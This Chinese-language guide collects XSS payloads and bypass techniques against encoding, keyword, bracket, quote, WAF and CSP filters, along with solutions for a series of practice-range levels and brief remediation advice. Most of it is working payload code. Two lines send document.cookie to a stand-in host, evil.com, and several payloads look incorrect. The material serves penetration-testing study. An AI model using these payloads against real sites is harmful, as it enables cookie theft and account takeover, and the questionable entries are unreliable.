# XSS Payload 和绕过技术完整指南

## 目录

1. [XSS Payload 基础形式](#一xss-payload-基础形式)
2. [编码绕过技术](#二编码绕过技术)
3. [JavaScript 语法绕过](#三javascript-语法绕过)
4. [标签绕过技术](#四标签绕过技术)
5. [事件处理器绕过](#五事件处理器绕过)
6. [过滤绕过技术](#六过滤绕过技术)
7. [上下文相关绕过](#七上下文相关绕过)
8. [高级绕过技术](#八高级绕过技术)
9. [注释绕过技术](#九注释绕过技术)
10. [冷门知识点汇总](#十冷门知识点汇总)
11. [实战绕过案例](#十一实战绕过案例)
12. [安全修复建议](#十二安全修复建议)
13. [总结](#十三总结)
14. [WAF 绕过技术](#十四waf-绕过技术)
15. [DOM XSS 技术](#十五dom-xss-技术)
16. [CSP 绕过技术](#十六csp-绕过技术)
17. [测试 Payload 汇总](#十七测试-payload-汇总)
18. [针对特定过滤器的 Payload](#十八针对特定过滤器的-payload)
19. [实战测试策略](#十九实战测试策略)
20. [常见过滤器绕过表](#二十常见过滤器绕过表)

---

## 一、XSS Payload 基础形式

### 1.1 基础 Script 标签注入

```javascript
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

### 1.2 事件处理器注入

```javascript
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

### 1.3 HTML 属性注入

```javascript
" onmouseover=alert(1) x="
' onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
```

### 1.4 JavaScript 伪协议

```javascript
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)">
<button formaction="javascript:alert(1)">Click</button>
```

### 1.5 数据 URI

```javascript
<iframe src="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">
```

---

## 二、编码绕过技术

### 2.1 HTML 实体编码

```javascript
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

**原理**：HTML 实体编码在页面渲染时会自动转换为原字符，且转换不受大写影响。

### 2.2 URL 编码

```javascript
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

### 2.3 Unicode 编码

```javascript
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\u003Cimg src=x onerror=alert(1)\u003E
```

### 2.4 十六进制编码

```javascript
\x3Cscript\x3Ealert(1)\x3C/script\x3E
\x3Cimg src=x onerror=alert(1)\x3E
```

### 2.5 八进制编码

```javascript
\074script\076alert(1)\074/script\076
```

### 2.6 Base64 编码

```javascript
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

## 三、JavaScript 语法绕过

### 3.1 反引号替代圆括号

```javascript
<script>alert`1`</script>
<script>alert`document.cookie`</script>
```

### 3.2 括号替代

```javascript
<script>alert(1)</script>
<script>alert.call(null,1)</script>
<script>alert.apply(null,[1])</script>
```

### 3.3 点号替代

```javascript
<script>alert(document.cookie)</script>
<script>alert(document['cookie'])</script>
<script>alert(document["cookie"])</script>
<script>alert(window["document"]["cookie"])</script>
```

### 3.4 分号替代

```javascript
<script>alert(1);alert(2)</script>
<script>alert(1)%0Aalert(2)</script>
<script>alert(1)%0Dalert(2)</script>
```

---

## 四、标签绕过技术

### 4.1 大小写绕过

```javascript
<SCRIPT>alert(1)</SCRIPT>
<Script>alert(1)</Script>
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

### 4.2 自闭合标签绕过

```javascript
<script>alert(1)//<script>
<script>alert(1)//
<img src=x onerror=alert(1)//
```

### 4.3 标签分割

```javascript
<scr<script>ipt>alert(1)</scr<script>ipt>
<scr%00ipt>alert(1)</scr%00ipt>
```

### 4.4 空白字符绕过

```javascript
< script>alert(1)< /script>
<script >alert(1)</script >
<script/onload=alert(1)>
<script/onload=alert(1)>
```

### 4.5 换行符绕过

```javascript
<script>
alert(1)
</script>

<img/src=x/onerror=alert(1)>
<img
src
=
x
onerror
=
alert(1)
>
```

---

## 五、事件处理器绕过

### 5.1 各种事件处理器

```javascript
onload
onerror
onmouseover
onfocus
onblur
onclick
ondblclick
onmousedown
onmouseup
onmouseenter
onmouseleave
onkeydown
onkeyup
onkeypress
onsubmit
onreset
onchange
oninput
ontoggle
onanimationstart
onanimationend
ontransitionend
onpageshow
onpagehide
onpopstate
onhashchange
```

### 5.2 autofocus 技巧

```javascript
<input autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)></textarea>
<select autofocus onfocus=alert(1)></select>
<button autofocus onfocus=alert(1)></button>
```

### 5.3 自动触发事件

```javascript
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<embed src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

---

## 六、过滤绕过技术

### 6.1 关键字过滤绕过

```javascript
// script 过滤
<scr<script>ipt>alert(1)</scr<script>ipt>
<scRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert(1)>

// alert 过滤
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

### 6.2 引号过滤绕过

```javascript
<script>alert(1)</script>
<script>alert`1`</script>
<script>alert(String.fromCharCode(49))</script>
<script>alert(/1/.source)</script>
```

### 6.3 圆括号过滤绕过

```javascript
<script>alert`1`</script>
<script>alert.call(null,1)</script>
<script>setTimeout`alert\u00281\u0029`</script>
```

### 6.4 空格过滤绕过

```javascript
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<script/onload=alert(1)>
```

### 6.5 特殊字符过滤绕过

```javascript
// / 过滤
<script>alert(1)</script>
<script>alert.call(null,1)</script>

// < 过滤
<iframe src="javascript:alert(1)">
<img src=x onerror=alert(1)>

// > 过滤
<script>alert(1)//
<img src=x onerror=alert(1)//
```

---

## 七、上下文相关绕过

### 7.1 HTML 注释上下文

```javascript
<!-- --><script>alert(1)</script>
<!-- --!><script>alert(1)</script>
<!-- --><img src=x onerror=alert(1)>
```

### 7.2 Script 标签上下文

```javascript
// 在 script 标签内
';alert(1);//
</script><script>alert(1)</script>
`);alert(1);//
```

### 7.3 属性值上下文

```javascript
" onmouseover=alert(1) x="
' onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
```

### 7.4 JavaScript 字符串上下文

```javascript
';alert(1);//
');alert(1);//
`);alert(1);//
</script><script>alert(1)</script>
```

---

## 八、高级绕过技术

### 8.1 Unicode 欺骗

```javascript
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>\u{61}\u{6c}\u{65}\u{72}\u{74}(1)</script>
```

### 8.2 CSS 注入

```javascript
<style>
  @import url('javascript:alert(1)');
</style>
<style>
  body { background: url('javascript:alert(1)'); }
</style>
<style>
  x:expression(alert(1));
</style>
### 8.3 SVG 注入

```javascript
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><g onload=alert(1)></g></svg>
```

---

## 九、注释绕过技术

### 9.1 HTML 注释符

```javascript
// 常规注释符
<!-- -->
<!-- --!>  // 冷门注释符，同样可闭合注释

// 使用示例
<!-- --><script>alert(1)</script>
<!-- --!><script>alert(1)</script>
```

**原理**：HTML 注释符有两种写法：`<!-- -->`（常规）和 `<!-- --!>`（冷门），同样可闭合注释。

### 9.2 JavaScript 注释符

```javascript
// 单行注释
/* 多行注释 */
--> HTML 单行注释符（可注释掉后续内容）
```

**原理**：`-->` 是 HTML 的单行注释符，可注释掉后续内容，且不被当前过滤规则拦截。

### 9.3 注释绕过过滤

```javascript
// 在 JavaScript 上下文中
alert(1)//  // 注释掉后续代码
alert(1)-->  // 使用 HTML 注释符

// 在 HTML 上下文中
<!-- --><script>alert(1)</script>
<!-- --!><script>alert(1)</script>
```

---

## 十、冷门知识点汇总

### 10.1 古英文字符绕过

```javascript
// ſ 是 s 的异体字，其大写形式为 S，且不被 [a-zA-Z] 过滤
<ſvg/onload=alert(1)>  // 大写后变为 <SVG/ONLOAD=ALERT(1)>
```

**原理**：古英文（古拉丁文）中，`ſ` 是 `s` 的异体字，其大写形式为 `S`，且不被 `[a-zA-Z]` 过滤。

### 10.2 不闭合标签执行

```javascript
// HTML 中部分标签无需完整闭合，只要事件属性存在即可触发执行
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

**原理**：部分标签无需完整闭合，只要事件属性（如 `onload`、`onerror`）存在，即可触发执行。

### 10.3 空格闭合标签

```javascript
// 在 </style> 的 style 后加空格，可绕过过滤且正常闭合标签
</style >
```

**原理**：空格不影响标签闭合功能，但能绕过正则匹配。

### 10.4 throw + onerror 绕过括号

```javascript
// 利用 window.onerror 捕获错误并执行 eval，将代码藏在错误信息中
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
<img src onerror="window.onerror=eval;throw'=alert\x281\x29';">
```

**原理**：`\x28` 是 `(` 的十六进制编码，`throw` 抛出的字符串会被 `eval` 解析执行。

### 10.5 实体编码绕过大写

```javascript
// HTML 实体编码在页面渲染时自动转换为原字符，且转换不受大写影响
</H1> <img src=M onerror=alert(1)>
```

**原理**：`alert(1)` 在属性内，不被大写转换影响，直接执行。

### 10.6 双写绕过

```javascript
// 过滤 script 时，可以双写绕过
<scrscriptipt>alert(1)</scrscriptipt>
```

**原理**：`scrscriptipt` 被过滤后变为 `script`。

---

## 十一、实战绕过案例

### 11.1 0x00 - 无过滤

```javascript
<script>alert(1)</script>
```

### 11.2 0x01 - textarea 标签闭合

```javascript
</textarea><script>alert(1)</script>
```

### 11.3 0x02 - input 标签属性注入

```javascript
" onfocus=alert(1) autofocus "
```

### 11.4 0x03 - 括号过滤

```javascript
// 方案 1：反引号替代
<script>alert`1`</script>

// 方案 2：throw 绕过
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

### 11.5 0x04 - 括号和反引号过滤

```javascript
<img src onerror="window.onerror=eval;throw'=alert\x281\x29';">
```

### 11.6 0x05 - HTML 注释符过滤

```javascript
--!><script>alert(1)</script>
```

### 11.7 0x06 - 正则过滤 auto/on.*=/>/ig

```javascript
onfocus
=alert(1);
```

**原理**：换行符会打断正则表达式 `on.*=` 中 `.*` 的连续匹配。

### 11.8 0x07 - 过滤所有标签

```javascript
<svg/onload=alert(1)>
```

**原理**：不闭合的标签不包含 `>`，因此不被正则 `<\\/?[^>]+>` 匹配。

### 11.9 0x08 - 过滤 </style>

```javascript
</style >
<img src="" onerror=alert(1) >
```

**原理**：空格不影响标签闭合功能，但能绕过正则匹配。

### 11.10 0x09 - URL 验证

```javascript
http://www.segmentfault.com" onerror="alert(1)
```

### 11.11 0x0A - URL 验证 + 实体编码

```javascript
https://www.segmentfault.com.haozi.me/j.js
```

**原理**：利用靶场自带的 JS 文件 `j.js`，内容为 `alert(1)`。

### 11.12 0x0B - 大写转换

```javascript
</H1> <img src=M onerror=alert(1)>
```

### 11.13 0x0C - 过滤 script + 大写转换

```javascript
</H1> <img src onerror=alert(1)>
```

**其他方案**：
- 双写 script：`</H1> <scrscriptipt src onerror=alert(1)></scrscriptipt>`
- svg 标签：`</H1> <svg onload=alert(1)>`

### 11.14 0x0D - 过滤 <>/'" + 单行注释

```javascript
（第一行：回车）
alert(1);
-->
```

### 11.15 0x0E - 过滤 <+字母 + 大写转换

```javascript
<ſvg/onload=alert(1)>
```

### 11.16 0x0F - 实体编码 + console.error

```javascript
'),alert(1); //
```

### 11.17 0x10 - 无过滤

```javascript
alert(1);
```

### 11.18 0x11 - JavaScript 字符串转义

```javascript
"); alert(1) //
```

**原理**：转义后的 `//` 仍能实现注释效果。

### 11.19 0x12 - 仅过滤双引号

```javascript
\");alert(1)//
```

**原理**：`\` 使 `\"` 变为 `"`。

---

## 十二、安全修复建议

### 12.1 输入验证

- 对所有用户输入进行严格的验证和过滤
- 使用白名单机制限制允许的输入
- 避免使用黑名单机制（容易被绕过）

### 12.2 输出编码

- 对用户输入进行 HTML 实体编码
- 对 JavaScript 代码中的用户输入进行 JavaScript 编码
- 使用安全的模板引擎（如 React、Vue、Angular）

### 12.3 内容安全策略

- 实施严格的内容安全策略 (CSP)
- 限制外部脚本源的加载
- 禁用内联脚本执行

### 12.4 正则表达式改进

- 考虑换行符、空格等特殊情况
- 使用 Unicode 感知的正则表达式
- 避免使用简单的黑名单正则

---

## 十三、总结

本指南涵盖了 XSS 攻击的各种 Payload 形式和绕过技术，包括：

1. 基础 XSS Payload 形式
2. 多种编码绕过技术
3. JavaScript 语法绕过
4. 标签绕过技术
5. 事件处理器绕过
6. 注释绕过技术
7. 冷门知识点汇总
8. 实战绕过案例

通过学习这些技术，可以更好地理解 XSS 攻击的原理和绕过方法，从而更好地防范 XSS 漏洞。

**重要提醒**：
- 不要死记 Payload，先理解每关的源码过滤规则
- 遇到卡关时，多尝试"反常识"操作
- 记录靶场中的冷知识，这些在真实场景中可能用到

---

**文档版本**: 1.0
**最后更新**: 2026-02-06

---

## 十四、WAF 绕过技术

### 14.1 随机大小写

```javascript
<ScRiPt>AlErT(1)</ScRiPt>
<ImG SrC=x OnErRoR=AlErT(1)>
```

### 14.2 插入垃圾字符

```javascript
<scri<!--x-->pt>alert(1)</scri<!--x-->pt>
<img sr<!--x-->c=x onerr<!--x-->or=alert(1)>
```

### 14.3 双重编码

```javascript
%253Cscript%253Ealert(1)%253C/script%253E
```

### 14.4 混合编码

```javascript
<scr\u0069pt>alert(1)</scr\u0069pt>
<img src=x onerror=al\u0065rt(1)>
```

---

## 十五、DOM XSS 技术

### 15.1 Location 操作

```javascript
#hash
<script>eval(location.hash.slice(1))</script>
#<script>alert(1)</script>

#search
<script>eval(location.search.slice(1))</script>
?<script>alert(1)</script>
```

### 15.2 Cookie 操作

```javascript
<script>document.write(document.cookie)</script>
<script>fetch('http://evil.com?c='+document.cookie)</script>
```

### 15.3 DOM 操作

```javascript
<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
<script>document.createElement('img').src='x';document.querySelector('img').onerror=alert(1)</script>
```

---

## 十六、CSP 绕过技术

### 16.1 JSONP 绕过

```javascript
<script src="https://vulnerable.com/callback?callback=alert(1)"></script>
```

### 16.2 预加载绕过

```javascript
<link rel="preload" href="data:text/html,<script>alert(1)</script>" as="script">
```

### 16.3 iframe 绕过

```javascript
<iframe srcdoc="<script>alert(1)</script>">
```

---

## 十七、测试 Payload 汇总

### 17.1 基础测试集

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onmouseover=alert(1) x="
' onmouseover=alert(1) x="
javascript:alert(1)
```

### 17.2 编码测试集

```javascript
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\x3Cscript\x3Ealert(1)\x3C/script\x3E
```

### 17.3 绕过测试集

```javascript
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr<script>ipt>
<script>alert`1`</script>
<script/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

---

## 十八、针对特定过滤器的 Payload

### 18.1 过滤 script

```javascript
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
```

### 18.2 过滤 alert

```javascript
<script>prompt(1)</script>
<script>confirm(1)</script>
<script>eval('aler\x74(1)')</script>
<script>setTimeout('alert(1)')</script>
```

### 18.3 过滤 onerror

```javascript
<img src=x onload=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### 18.4 过滤 onload

```javascript
<img src=x onerror=alert(1)>
<svg onerror=alert(1)>
<body onmouseover=alert(1)>
```

### 18.5 过滤圆括号

```javascript
<script>alert`1`</script>
<script>alert.call(null,1)</script>
<script>setTimeout`alert\u00281\u0029`</script>
```

### 18.6 过滤引号

```javascript
<script>alert(1)</script>
<script>alert`1`</script>
<script>alert(/1/.source)</script>
```

### 18.7 过滤空格

```javascript
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<script/onload=alert(1)>
```

---

## 十九、实战测试策略

### 19.1 测试顺序

1. **基础测试**: 尝试最简单的 payload
2. **编码测试**: 尝试各种编码方式
3. **绕过测试**: 尝试各种绕过技术
4. **上下文测试**: 根据注入点上下文调整 payload
5. **组合测试**: 组合多种绕过技术

### 19.2 测试方法

1. **观察过滤**: 分析哪些字符被过滤
2. **测试边界**: 测试过滤器的边界条件
3. **组合技术**: 组合多种绕过技术
4. **持续尝试**: 不要放弃，持续尝试新方法

### 19.3 成功标准

- 弹出 alert(1)
- 页面标题变为 "警报（1） --- alert(1)"
- 控制台执行 alert(1)

---

## 二十、常见过滤器绕过表

| 过滤器 | 绕过方法 |
|--------|----------|
| script | img, svg, iframe, body |
| alert | prompt, confirm, eval |
| onerror | onload, onmouseover, onfocus |
| onload | onerror, onmouseover, onfocus |
| () | 反引号, call, apply |
| "" | 反引号, /1/.source |
| 空格 | /, 换行符 |
| 大小写 | 混合大小写, Unicode |
| HTML 实体 | 原始字符, Unicode |
| URL 编码 | 原始字符, 双重编码 |

---

**文档结束**

*本文档仅供授权的安全测试使用。未经授权的渗透测试是非法的。*
